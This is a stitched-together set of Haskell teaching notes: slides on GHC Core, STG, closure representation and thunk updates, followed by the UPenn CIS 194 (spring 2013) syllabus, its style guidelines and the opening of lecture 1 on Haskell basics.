         (id @ GHC.Types.Int)

Dictionaries constructed from dictionaries
==========================================

Haskell 

.. code:: haskell

   instance (MyEnum a) => MyEnum (Maybe a) where
      toId (Nothing) = 0
      toId (Just n)  = toId n
      fromId 0       = Nothing
      fromId n       = Just $ fromId n

Core 

.. code:: haskell

   fMyEnumMaybe :: forall a. MyEnum a => MyEnum (Maybe a)
   fMyEnumMaybe =  (@ a) (dict :: MyEnum a) ->
       DMyEnum @ (Maybe a)
         (fMyEnumMaybe_ctoId @ a dict)
         (fMyEnumMaybe_cfromId @ a dict)

   fMyEnumMaybe_ctoId :: forall a. MyEnum a => Maybe a -> Int
   fMyEnumMaybe_ctoId =  (@ a) (dict :: MyEnum a) (mx :: Maybe a) ->
       case mx of _
         Nothing -> I# 0
         Just n  -> case (toId @ a dict n) of _ 
                       I# y -> I# (1 +# y)

UNPACK unboxes types
====================

Haskell 

.. code:: haskell

   data Point = Point {-# UNPACK #-} !Int
                      {-# UNPACK #-} !Int

Core 

.. code:: haskell

   data Point = Point Int# Int#

-  Only one data type for Point exists, GHC doesn’t duplicate it.

UNPACK not always a good idea
=============================

Haskell 

.. code:: haskell

   addP :: P -> Int
   addP (P x y ) = x + y

Core 

.. code:: haskell

   addP :: P -> Int
   addP =  (p :: P) -> 
       case p of _ {
         P x y -> case +# x y of z {
           __DEFAULT -> I# z
         }
       }

-  Great code here as working with unboxed types.

.. _unpack-not-always-a-good-idea-1:

UNPACK not always a good idea
=============================

Haskell 

.. code:: haskell

   module M where

   {-# NOINLINE add #-}
   add x y = x + y

   module P where

   addP_bad (P x y) = add x y

Core 

.. code:: haskell

   addP_bad =  (p :: P) ->
       case p of _ {
         P x y ->
           let { x' = I# x
                 y' = I# y 
           } in M.add x' y'
       }

-  Need to unfortunately rebox the types.

Core Summary
============

-  Look at Core to get an idea of how your code will perform.
-  Can see boxing an unboxing.
-  Language still lazy but ``case`` means evaluation.

Middle of GHC: *Core -> Core*
=============================

A lot of the optimizations that GHC does is through core to core
transformations.

Lets look at two of them:

-  Strictness and unboxing
-  SpecConstr

::

   Fun Fact: Estimated that functional languages gain 20 - 40%
   improvement from inlining Vs. imperative languages which gain 10 - 15%

Strictness & Unboxing
=====================

Consider this factorial implementation in Haskell:

.. code:: haskell

   fac :: Int -> Int -> Int
   fac x 0 = a
   fac x n = fac (n*x) (n-1)

-  In Haskell ``x`` & ``n`` must be represented by pointers to a
   possibly unevaluated objects (thunks)
-  Even if evaluated still represented by “boxed” values on the heap

.. _strictness-unboxing-1:

Strictness & Unboxing
=====================

Core 

.. code:: haskell

   fac :: Int -> Int -> Int
   fac =  (x :: Int) (n :: Int) ->
       case n of _ {
         I# n# -> case n# of _
                   0#        -> x
                   __DEFAULT -> let { one = I# 1
                                      n' = n - one
                                      x' = n * x
                                    }
                                in  fac x' n'

-  We allocate thunks before the recursive call and box arguments
-  But ``fac`` will immediately evaluate the thunks and unbox the
   values!

GHC with strictness analysis
============================

Compile ``fac`` with optimizations.

.. code:: haskell

   wfac :: Int# -> Int# -> Int#
   wfac =  x# n# ->
       case n# of _
         0# -> x#
         _  -> case (n# -# 1#) of n'#
                 _ -> case (n# *# x#) of x'#
                        _ -> $wfac x'# n'#

   fac :: Int -> Int -> Int
   fac =  a n ->
       case a of
         I# a# -> case n of
                    I# n# -> case ($wfac a# n#) of
                               r# -> I# r#

-  Create an optimized ‘worker’ and keep original function as ‘wrapper’
   to preserve interface.
-  Must preserve semantics of :math:`\bot` – ``fac`` :math:`\bot`
   ``n = optimized(fac)`` :math:`\bot` ``n``

.. raw:: html

   <!--
   * Strictness analysis has discovered that `fac` is strict in both
     arguments
   * So creates a new 'worker' variant of `fac` that uses unboxed types
     and no thunks
   * Keeps original function `fac` though, referred to as the 'wrapper'
     to supply the correct type interface for other code.
   * As the wrapper uses unboxed types and is tail recursive, this will
     compile to a tight loop in machine code!
   -->

SpecConstr: Extending strictness analysis to paths
==================================================

The idea of the SpecConstr pass is to extend the strictness and unboxing
from before but to functions where arguments aren’t strict in every code
path.

Consider this Haskell function:

.. code:: haskell

   drop :: Int -> [a] -> [a]
   drop n []     = []
   drop 0 xs     = []
   drop n (x:xs) = drop (n-1) xs

-  Not strict in first argument:

   -  ``drop`` :math:`\bot` [] = []
   -  ``drop`` :math:`\bot` (x:xs) = :math:`\bot`

.. raw:: html

   <!--
   * Would like to pass `n` unboxed but it isn't strict in the first
     pattern. i.e:
   -->

.. _specconstr-extending-strictness-analysis-to-paths-1:

SpecConstr: Extending strictness analysis to paths
==================================================

So we get this code without extra optimization:

.. code:: haskell

   drop n xs = case xs of
                 []     -> []
                 (y:ys) -> case n of 
                             I# n# -> case n# of
                                         0 -> []
                                         _ -> let n' = I# (n# -# 1#)
                                              in drop n' ys

-  But after the first time we call drop, we are strict in ``n`` and
   always evaluate it!

SpecConstr
==========

The SpecConstr pass takes advantage of this to create a specialised
version of ``drop`` that is only called after we have passed the first
check.

.. code:: haskell

   drop n xs = case xs of
                 []     -> []
                 (y:ys) -> case n of 
                             I# n# -> case n# of
                                         0 -> []
                                         _ -> drop' (n# -# 1#) xs

   -- works with unboxed n
   drop' n# xs = case xs of
                  []     -> []
                  (y:ys) -> case n# of
                              0# -> []
                              _  -> drop (n# -# 1#) xs

-  To stop code size blowing up, GHC limits the amount of specialized
   functions it creates (specified with the ``-fspec-constr-threshol``
   and ``-fspec-constr-count`` flags).

STG Code
========

-  After Core, GHC compiles to another intermediate language called STG.

.. raw:: html

   <!--
   * In the next few slides the code Ill be showing isn't exactly Core
     but a IR GHC uses after Core called STG. (Ive cleaned up the STG
     though so its not `true` syntax)
   -->

-  STG is very similar to Core but has one nice additional property:

   -  laziness is ‘explicit’
   -  ``case`` = *evaluation* and ONLY place evaluation occurs (true in
      Core)
   -  ``let`` = *allocation* and ONLY place allocation occurs (not true
      in Core)
   -  So in STG we can explicitly see thunks being allocated for
      laziness using ``let``

-  To view STG use:

   ::

      ghc -ddump-stg A.hs > A.stg

.. _stg-code-1:

STG Code
========

Haskell 

.. code:: haskell

   map :: (a -> b) -> [a] -> [b]
   map f []     = []
   map f (x:xs) = f x : map f xs

STG

.. code:: haskell

   map :: forall a b. (a -> b) -> [a] -> [b]
   map = \r [f xs]
           case xs of _
             []     -> [] []
             : z zs -> let { bds = \u [] map f zs;
                             bd  = \u [] f z; }
                       in  : [bd bds]

-  Lambda abstraction as ``[arg1 arg2] f``
-  ``\r`` - re-entrant
-  ``\u`` - updatable (i.e., thunk)

Graph Reduction as a computational model for Haskell
====================================================

Graph reduction is a good computational model for lazy functional
languages.

.. code:: haskell

   f g = let x = 2 + 2
         in (g x, x)

.. container::

   .. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/graph.png

.. _graph-reduction-as-a-computational-model-for-haskell-1:

Graph Reduction as a computational model for Haskell
====================================================

Graph reduction is a good computational model for lazy functional
languages.

.. code:: haskell

   f g = let x = 2 + 2
         in (g x, x)

.. container::

   .. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/graph-reduced.png

.. _graph-reduction-as-a-computational-model-for-haskell-2:

Graph Reduction as a computational model for Haskell
====================================================

Graph reduction is a good computational model for lazy functional
languages.

-  Graph reduction allows lazy evaluation and sharing
-  *let*: adds new node to graph.
-  *case*: expression evaluation, causes the graph to be reduced.
-  When a node is reduced, it is replaced (or *updated*) with its result

Can think of your Haskell program as progressing by either adding new
nodes to the graph or reducing existing ones.

GHC execution model
===================

-  GHC uses closures as a unifying representation.

   -  All objects in the heap are closures.
   -  A stack frame is a closure.

-  GHC uses continuation-passing-style.

   -  Always jump to top stack frame to return.
   -  Functions will prepare stack in advance to setup call chains.

Closure Representation
======================


.. figure:: https://www.scs.stanford.edu/14sp-cs240h/slides/heap-object.png

   Closure

.. figure:: https://www.scs.stanford.edu/14sp-cs240h/slides/basic-itbl.png

   Info Table


-  Header usually just a pointer to the code and metadata for the
   closure.
-  Get away with single pointer through positive and negative offsets.
-  Payload contains the closures environment (e.g free variables,
   function arguments)

Data closure
============

.. code:: haskell

   data G = G (Int -> Int) {-# UNPACK #-} !Int

-  ``[Header | Pointers... | Non-pointers...]``
-  Payload is the values for the constructor
-  Entry code for a constructor just returns

.. code:: asm

   jmp Sp[0]

Function closures
=================

.. code:: haskell

   f = \x -> let g = \y -> x + y
             in g x

-  [Header \| Pointers… \| Non-pointers…]
-  Payload is the bound free variables, e.g.,

   -  ``[ &g | x ]``

-  Entry code is the function code

Partial application closures (PAP)
==================================

.. code:: haskell

   foldr (:)

-  ``[Header | Arity | Payload size | Function | Payload]``
-  Arity of the PAP (function of arity 3 with 1 argument applied gives
   PAP of arity 2)
-  Function is the closure of the function that has been partially
   applied

.. raw:: html

   <!--
   * PAPs should never be entered so the entry code is some failure
     code
   -->

Thunk closures
==============

.. code:: haskell

   range = [1..100]

-  ``[Header | Pointers... | Non-pointers...]``
-  Payload contains the free variables of the expression
-  Differ from function closure in that they can be updated
-  Entry code is the code for the expression

Calling convention
==================

-  On X86 32bit - all arguments passed on stack

-  On X86 64bit - first 5 arguments passed in registers, rest on stack

-  ``R1`` register in Cmm code usually is a pointer to the current
   closure (i.e., similar to ``this`` in OO languages).

Handling thunk updates
======================

-  Thunks once evaluated should update their node in the graph to be the
   computed value.

-  GHC uses a *self-updating-model* – code unconditionally jumps to a
   thunk. Up to thunk to update itself, replacing code with value.

.. image:: https://www.scs.stanford.edu/14sp-cs240h/slides/graph-reduced.png

.. _handling-thunk-updates-1:

Handling thunk updates
======================

.. code:: haskell

   mk :: Int -> Int
   mk x = x + 1

.. code:: c

   // thunk entry - setup stack, evaluate x
   mk_entry()
       entry:
           if (Sp - 24 < SpLim) goto gc;

           I64[Sp - 16] = stg_upd_frame_info;  // setup update frame (closure type)
           I64[Sp -  8] = R1;                  // set thunk to be updated (payload)

           I64[Sp - 24] = mk_exit;             // setup continuation (+) continuation

           Sp = Sp - 24;                       // increase stack
           R1 = I64[R1 + 8];                   // grab 'x' from environment
           jump I64[R1] ();                    // eval 'x'

       gc: jump stg_gc_enter_1 ();
   }

.. _handling-thunk-updates-2:

Handling thunk updates
======================

.. code:: haskell

   mk :: Int -> Int
   mk x = x + 1

.. code:: c

   // thunk exit - setup value on heap, tear-down stack
   mk_exit()
       entry:
           Hp = Hp + 16;
           if (Hp > HpLim) goto gc;

           v::I64 = I64[R1] + 1;               // perform ('x' + 1)

           I64[Hp - 8] = GHC_Types_I_con_info; // setup Int closure
           I64[Hp + 0] = v::I64;               

           R1 = Hp;                            // point R1 to computed thunk value
           Sp = Sp + 8;                        // pop stack
           jump (I64[Sp + 0]) ();              // jump to continuation ('stg_upd_frame_info')

       gc: HpAlloc = 16;
           jump stg_gc_enter_1 ();
   }

stg_upd_frame_info code updates a thunk with its value
======================================================

-  To update a thunk with its value we need to change its header
   pointer.

-  Should point to code that simply returns now.

-  Payload also now needs to include the value.

-  Naive solution would be to synchronize on every thunk access.

-  But we don’t need to! Races on thunks are fine since we can rely on
   purity. Races just leads to duplication of work.

.. _stg_upd_frame_info-code-updates-a-thunk-with-its-value-1:

stg_upd_frame_info code updates a thunk with its value
======================================================

Thunk closure:

-  ``[Header | Payload]``

-  ``Header`` = ``[ Info Table Pointer | Result Slot ]``

-  Result slot empty when thunk unevaluated.

-  Update code, first places result in result slot and secondly changes
   the info table pointer.

-  Safe to do without synchronization (need write barrier) on all
   architectures GHC supports.

Avoiding entering values
========================

-  Evaluation model is we always enter a closure, even values.

-  This is poor for performance, we prefer to avoid entering values
   every single time.

-  An optimization that GHC does is *pointer tagging*. The trick is to
   use the final bits of a pointer which are usually zero (last 2 for
   32bit, 3 on 64) for storing a ‘tag’.

-  GHC uses this tag for:

   -  If the object is a constructor, the tag contains the constructor
      number (if it fits)
   -  If the object is a function, the tag contains the arity of the
      function (if it fits)

.. _avoiding-entering-values-1:

Avoiding entering values
========================

Our example code from before:

.. code:: haskell

   mk :: Int -> Int
   mk x = x + 1

Changes with pointer tagging:

.. code:: c

   mk_entry()
       entry:
            ...
            R1 = I64[R1 + 16];          // grab 'x' from environment
            if (R1 & 7 != 0) goto cxd;  // check if 'x' is eval'd
            jump I64[R1] ();            // not eval'd so eval
       cxd: jump mk_exit ();            // 'x' eval'd so jump to (+) continuation
   }

   mk_exit()
       cx0:
           I64[Hp - 8] = ghczmprim_GHCziTypes_Izh_con_info; // setup Int closure
           I64[Hp + 0] = v::I64;               // setup Int closure
           R1 = Hp - 7;                        // point R1 to computed thunk value (with tag)
           ...
   }

Pointer tagging makes your own data types efficient
===================================================

-  If the closure is a constructor, the tag contains the constructor
   number (if it fits).

.. code:: haskell

   data MyBool a = MTrue a | MFalse a

-  Will be as efficient as using an ``Int#`` for representing true and
   false.




===================================================
/. 🚀 University of Pennsylvania's CIS 194
===================================================
-  `University of Pennsylvania's CIS 194 <https://www.seas.upenn.edu/~cis1940/spring13/>`__

GHCi 和 Hugs 可以解析扩展名为 .hs 和 .lhs 的文件。 其中 .lhs（literate Haskell script）
文件是含字面量文本的脚本文档，其中包含有效程序代码，可以用大于号（>）和空格开头。 比如：
::

   add :: Int -> Int -> Int 
   add x y = x + y

其它符号开头的内容将被视作注释处理，且注释与代码间必须有一行以上的间隔。 还有一些 .lhs 文件中的 
代码以 begin {code} 以 end {code} 结尾。如果 .lhs 文件遵守一定的格式，就可以使用 lhs2tex 
工具生成非常精美的文档以供人们阅读。

.. container::
   :name: canvas

   .. container::
      :name: content

      All homework assignments should emerge creatively from the `Style
      guidelines <docs/style.pdf>`__. Homework is due each Monday **by
      the start of class**.

      `HW submission site <http://cis194.herokuapp.com/>`__ / `HW
      submission instructions <submission/hwsubmission.html>`__

      -  Week 1 (14 January): 
         `Introduction to Haskell <https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.lhs>`__ )

         -  `Homework 1 <https://www.seas.upenn.edu/~cis1940/spring13/hw/01-intro.pdf>`__: due Monday, 21 January.

      -  Week 2 (21 January): 
         `Algebraic Data Types <https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/02-ADTs.lhs>`__ )

         -  `Homework 2 <https://www.seas.upenn.edu/~cis1940/spring13/hw/02-ADTs.pdf>`__: due Monday, 28 January. [
            `error.log <https://www.seas.upenn.edu/~cis1940/spring13/extras/02-ADTs/error.log>`__,
            `sample.log <https://www.seas.upenn.edu/~cis1940/spring13/extras/02-ADTs/sample.log>`__,
            `Log.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/02-ADTs/Log.hs>`__ ]

      -  Week 3 (28 January): 
         `Recursion patterns, polymorphism, and the Prelude <https://www.seas.upenn.edu/~cis1940/spring13/lectures/03-rec-poly.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/03-rec-poly.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/03-rec-poly.lhs>`__ )

         -  `Homework 3 <https://www.seas.upenn.edu/~cis1940/spring13/hw/03-rec-poly.pdf>`__: due Monday, 4 February.

      -  Week 4 (4 February): 
         `Higher-order programming and type inference <https://www.seas.upenn.edu/~cis1940/spring13/lectures/04-higher-order.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/04-higher-order.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/04-higher-order.lhs>`__ )

         -  `Homework 4 <https://www.seas.upenn.edu/~cis1940/spring13/hw/04-higher-order.pdf>`__: due Monday, 11
            February.

      -  Week 5 (11 February): 
         `More polymorphism and type classes <https://www.seas.upenn.edu/~cis1940/spring13/lectures/05-type-classes.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/05-type-classes.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/05-type-classes.lhs>`__ )

         -  `Homework 5 <https://www.seas.upenn.edu/~cis1940/spring13/hw/05-type-classes.pdf>`__: due Monday, 18
            February. [ `ExprT.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/05-type-classes/ExprT.hs>`__,
            `Parser.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/05-type-classes/Parser.hs>`__,
            `StackVM.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/05-type-classes/StackVM.hs>`__ ]

      -  Week 6 (18 February): 
         `Lazy evaluation <https://www.seas.upenn.edu/~cis1940/spring13/lectures/06-laziness.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/06-laziness.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/06-laziness.lhs>`__ )

         -  `Homework 6 <https://www.seas.upenn.edu/~cis1940/spring13/hw/06-laziness.pdf>`__: due Monday, 25
            February.

      -  Week 7 (25 February): 
         `Folds and monoids <https://www.seas.upenn.edu/~cis1940/spring13/lectures/07-folds-monoids.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/07-folds-monoids.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/07-folds-monoids.lhs>`__ )

         -  `Homework 7 <https://www.seas.upenn.edu/~cis1940/spring13/hw/07-folds-monoids.pdf>`__: due Monday, 11
            March. [ `Editor.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/Editor.hs>`__,
            `Buffer.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/Buffer.hs>`__,
            `Sized.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/Sized.hs>`__,
            `StringBuffer.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/StringBuffer.hs>`__,
            `StringBufEditor.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/StringBufEditor.hs>`__,
            `carol.txt <https://www.seas.upenn.edu/~cis1940/spring13/extras/07-folds-monoids/carol.txt>`__ ]

      -  Week 8 (11 March): 
         `IO <https://www.seas.upenn.edu/~cis1940/spring13/lectures/08-IO.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/08-IO.html>`__, `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/08-IO.lhs>`__ )

         -  `Homework 8 <https://www.seas.upenn.edu/~cis1940/spring13/hw/08-IO.pdf>`__: due Monday, 18 March. [
            `Employee.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/08-IO/Employee.hs>`__,
            `company.txt <https://www.seas.upenn.edu/~cis1940/spring13/extras/08-IO/company.txt>`__ ]

      -  Week 9 (18 March): 
         `Functors <https://www.seas.upenn.edu/~cis1940/spring13/lectures/09-functors.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/09-functors.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/09-functors.lhs>`__ )

         -  `Homework 9 <https://www.seas.upenn.edu/~cis1940/spring13/hw/09-functors.pdf>`__: due never (no HW this
            week).

      -  Week 10 (25 March): 
         `Applicative functors (part 1) <https://www.seas.upenn.edu/~cis1940/spring13/lectures/10-applicative.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/10-applicative.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/10-applicative.lhs>`__ )

         -  `Homework 10 <https://www.seas.upenn.edu/~cis1940/spring13/hw/10-applicative.pdf>`__: due Monday, 1
            April. [ `AParser.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/10-applicative/AParser.hs>`__ ]

      -  Week 11 (1 April): 
         `Applicative functors (part 2) <https://www.seas.upenn.edu/~cis1940/spring13/lectures/11-applicative2.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/11-applicative2.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/11-applicative2.lhs>`__ )

         -  `Homework 11 <https://www.seas.upenn.edu/~cis1940/spring13/hw/11-applicative2.pdf>`__: due Monday, 8
            April. [ `AParser.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/11-applicative2/AParser.hs>`__,
            `SExpr.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/11-applicative2/SExpr.hs>`__ ]

      -  Week 12 (8 April): 
         `Monads <https://www.seas.upenn.edu/~cis1940/spring13/lectures/12-monads.html>`__ 
         (`html <https://www.seas.upenn.edu/~cis1940/spring13/lectures/12-monads.html>`__,
         `lhs <https://www.seas.upenn.edu/~cis1940/spring13/lectures/12-monads.lhs>`__ )

         -  `Homework 12 <https://www.seas.upenn.edu/~cis1940/spring13/hw/12-monads.pdf>`__: due Monday, 15 April. [`Risk.hs <https://www.seas.upenn.edu/~cis1940/spring13/extras/12-monads/Risk.hs>`__ ]



Good Haskell Style

https://www.seas.upenn.edu/~cis1940/spring13/docs/style.pdf

All your submitted programming assignments should emerge creatively
from the following style guidelines. Programming is just as much social art
form as it is engineering discipline, and as any artist knows, constraints serve
to enhance rather than quench creativity.

These guidelines will be extended as the semester progresses.


• DO use camelCase for function and variable names.

• DO use descriptive function names, which are as long as they need to
     be but no longer than they have to be. Good: solveRemaining. Bad:
     slv. Ugly: solveAllTheCasesWhichWeHaven’tYetProcessed.

• DON’T use tab characters. Haskell is layout-sensitive and tabs Mess
     Everything Up. I don’t care how you feel about tabs when coding in
     other languages. Just trust me on this one. Note this does not mean
     you need to hit space a zillion times to indent each line; your Favorite
     Editor ought to support auto-indentation using spaces instead of tabs.

• DO try to keep every line under 80 characters. This isn’t a hard and
     fast rule, but code that is line-wrapped by an editor looks horrible.

• DO give every top-level function a type signature. Type signatures
     enhance documentation, clarify thinking, and provide nesting sites for
     endangered bird species. Top-level type signatures also result in better
     error messages. With no type signatures, type errors tend to show up
     far from where the real problem is; explicit type signatures help localize
     type errors.

     Locally defined functions and constants (part of a let expression or
     where clause) do not need type signatures, but adding them doesn’t
     hurt (in particular, the argument above about localizing type errors
     still applies).

• DO precede every top-level function by a comment explaining what it does.

• DO use -Wall. Either pass -Wall to ghc on the command line, or (easier) put::

    {-# OPTIONS_GHC -Wall #-}

     at the top of your .hs file. All your submitted programs should compile
     with no warnings.

• DO, as much as possible, break up your programs into small functions
     that do one thing, and compose them to create more complex functions.

• DO make all your functions total. That is, they should give sensible
     results (and not crash) for every input.

/CS194 Lectures 01 Haskell Basics
=================================

- https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.lhs
- https://www.seas.upenn.edu/~cis1940/spring13/lectures/01-intro.html

<!--
{-# OPTIONS_GHC -Wall #-}
-->


CIS 194 Week 1  
14 January 2013

Suggested reading: 

-   [Learn You a Haskell for Great Good, chapter 2](http://learnyouahaskell.com/starting-out)
-   [Real World Haskell](http://book.realworldhaskell.org/),
    chapters 1 and 2

What is Haskell?
----------------

Haskell is a *lazy, functional* programming language created in the
late 1980's by a committee of academics.  There were a plethora of
lazy functional languages around, everyone had their favorite, and it
was hard to communicate ideas.  So a bunch of people got together and
designed a new language, taking some of the best ideas from existing
languages (and a few new ideas of their own).  Haskell was born.

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/haskell-logo-small.png

So what is Haskell like?  Haskell is:

**Functional**

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/function-machine.png
   :width: 200px

There is no precise, accepted meaning for the term "functional".
But when we say that Haskell is a *functional* language, we usually
have in mind two things:

* Functions are *first-class*, that is, functions are values which can
  be used in exactly the same ways as any other sort of value.

* The meaning of Haskell programs is centered around *evaluating
  expressions* rather than *executing instructions*.

Taken together, these result in an entirely different way of thinking about
programming.  Much of our time this semester will be spent exploring
this way of thinking.

**Pure** 

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/pure.jpg
   :width: 200px

Haskell expressions are always *referentially transparent*, that is:

* No mutation!  Everything (variables, data structures...) is *immutable*.

* Expressions never have "side effects" (like updating global variables or
  printing to the screen).

* Calling the same function with the same arguments results in
  the same output every time.

This may sound crazy at this point.  How is it even possible to get
anything done without mutation or side effects?  Well, it certainly
requires a shift in thinking (if you're used to an imperative or
object-oriented paradigm).  But once you've made the shift, there are
a number of wonderful benefits:

* *Equational reasoning and refactoring*: In Haskell one can always
  "replace equals by equals", just like you learned in algebra class.

* *Parallelism*: Evaluating expressions in parallel is easy when they
  are guaranteed not to affect one another.

* *Fewer headaches*: Simply put, unrestricted effects and
  action-at-a-distance makes for programs that are hard to debug,
  maintain, and reason about.

**Lazy**

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/relax.jpg
   :width: 200px

In Haskell, expressions are *not evaluated until their results are
actually needed*.  This is a simple decision with far-reaching
consequences, which we will explore throughout the semester.  Some of
the consequences include:

* It is easy to define a new *control structure* just by defining a
  function.

* It is possible to define and work with *infinite data structures*.

* It enables a more compositional programming style (see *wholemeal
  programming* below).

* One major downside, however, is that reasoning about time and space
  usage becomes much more complicated!

**Statically typed**

.. image:: https://www.seas.upenn.edu/~cis1940/spring13/images/static.jpg
   :width: 200px

Every Haskell expression has a type, and types are all checked at
*compile-time*.  Programs with type errors will not even compile, much
less run.

Themes
------

Throughout this course, we will focus on three main themes.

**Types**

Static type systems can seem annoying.  In fact, in languages like C++
and Java, they *are* annoying.  But this isn't because static type
systems *per se* are annoying; it's because C++ and Java's type
systems are insufficiently expressive! This semester we'll take a
close look at Haskell's type system, which

* *Helps clarify thinking and express program structure*

    The first step in writing a Haskell program is usually to *write
    down all the types*.  Because Haskell's type system is so expressive,
    this is a non-trivial design step and is an immense help in
    clarifying one's thinking about the program.

* *Serves as a form of documentation*

    Given an expressive type system, just looking at a function's type
    tells you a lot about what the function might do and how it can be
    used, even before you have read a single word of written documentation.

* *Turns run-time errors into compile-time errors*

    It's much better to be able to fix errors up front than to just
    test a lot and hope for the best.  "If it compiles, it must be
    correct" is mostly facetious (it's still quite possible to have errors
    in logic even in a type-correct program), but it happens in Haskell
    much more than in other languages.

**Abstraction**

"Don't Repeat Yourself" is a mantra often heard in the world of
programming.  Also known as the "Abstraction Principle", the idea is
that nothing should be duplicated: every idea, algorithm, and piece of
data should occur exactly once in your code.  Taking similar pieces of
code and factoring out their commonality is known as the process of
*abstraction*.

Haskell is very good at abstraction: features like parametric
polymorphism, higher-order functions, and type classes all aid in the
fight against repetition.  Our journey through Haskell this semester
will in large part be a journey from the specific to the abstract.

**Wholemeal programming**

Another theme we will explore is *wholemeal programming*. A quote from
Ralf Hinze::

   "Functional languages excel at wholemeal programming, a term coined by
   Geraint Jones. Wholemeal programming means to think big: work with an
   entire list, rather than a sequence of elements; develop a solution
   space, rather than an individual solution; imagine a graph, rather
   than a single path. The wholemeal approach often offers new insights
   or provides new perspectives on a given problem. It is nicely
   complemented by the idea of projective programming: first solve a more
   general problem, then extract the interesting bits and pieces by
   transforming the general program into more specialised ones."

For example, consider this pseudocode in a C/Java-ish sort of language::

    int acc = 0;
    for ( int i = 0; i < lst.length; i++ ) {
      acc = acc + 3 * lst[i];
    }

This code suffers from what Richard Bird refers to as "indexitis": it
has to worry about the low-level details of iterating over an array by
keeping track of a current index.  It also mixes together what can
more usefully be thought of as two separate operations: multiplying
every item in a list by 3, and summing the results.

In Haskell, we can just write 

    sum (map (3*) lst)

This semester we'll explore the shift in thinking represented by this
way of programming, and examine how and why Haskell makes
it possible.

Literate Haskell
----------------

This file is a "literate Haskell document": only lines preceded by
> and a space (see below) are code; everything else (like this
paragraph) is a comment. Your programming assignments do not have
to be literate Haskell, although they may be if you like. Literate
Haskell documents have an extension of `.lhs`, whereas non-literate Haskell
source files use `.hs`.

Declarations and variables
--------------------------

Here is some Haskell code:"" 

   > x :: Int
   > x = 3
   > 
   > -- Note that normal (non-literate) comments are preceded by two hyphens
   > {- or enclosed
   >    in curly brace/hyphen pairs. -}

The above code declares a variable `x` with type `Int` (`::` is
pronounced "has type") and declares the value of `x` to be `3`. Note
that *this will be the value of `x` forever* (at least, in this
particular program). The value of `x` cannot be changed later.

Try uncommenting the line below; it will generate an error saying
something like ``Multiple declarations of `x'``.

> -- x = 4

In Haskell, *variables are not mutable boxes*; they are just names
for values!

Put another way, `=` does *not* denote "assignment" like it does in
many other languages. Instead, `=` denotes *definition*, like it does
in mathematics.  That is, `x = 4` should not be read as "`x` gets `4`"
or "assign `4` to `x`", but as "`x` is *defined to be* `4`".

What do you think this code means? ::

   > y :: Int
   > y = y + 1

Basic Types
-----------

   > -- Machine-sized integers
   > i :: Int
   > i = -78

`Int`s are guaranteed by the Haskell language standard to accommodate
values at least up to \\(\\pm 2^{29}\\), but the exact size depends on
your architecture.  For example, on my 64-bit machine the range is
\\(\\pm 2^{63}\\). You can find the range on your machine by
evaluating the following::

   > biggestInt, smallestInt :: Int
   > biggestInt  = maxBound
   > smallestInt = minBound

(Note that idiomatic Haskell uses `camelCase` for identifier names.
If you don't like it, tough luck.)

The `Integer` type, on the other hand, is limited only by the amount
of memory on your machine.::

   > -- Arbitrary-precision integers
   > n :: Integer
   > n = 1234567890987654321987340982334987349872349874534
   >
   > reallyBig :: Integer
   > reallyBig = 2^(2^(2^(2^2)))
   >
   > numDigits :: Int
   > numDigits = length (show reallyBig)

For floating-point numbers, there is `Double`::

   > -- Double-precision floating point
   > d1, d2 :: Double
   > d1 = 4.5387
   > d2 = 6.2831e-4

There is also a single-precision floating point number type, `Float`.

Finally, there are booleans, characters, and strings::

   > -- Booleans
   > b1, b2 :: Bool
   > b1 = True
   > b2 = False
   > 
   > -- Unicode characters
   > c1, c2, c3 :: Char
   > c1 = 'x'
